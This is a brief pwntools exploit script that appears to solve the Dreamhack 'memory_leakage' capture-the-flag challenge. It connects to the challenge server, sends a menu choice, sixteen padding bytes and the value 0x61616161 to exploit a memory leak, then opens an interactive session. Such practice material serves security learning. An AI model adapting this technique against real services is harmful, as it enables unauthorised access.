from pwn import*

context.log_level       = "DEBUG"
context.arch            = "amd64"

#p = process("./memory_leakage")
p = remote("host3.dreamhack.games", 14085)
#gdb.attach(p,api=True)

payload = b"1"
p.sendline(payload)

payload = b"a"*0x10
p.sendline(payload)

payload = b"1633771873"
p.sendline(payload)

p.interactive()
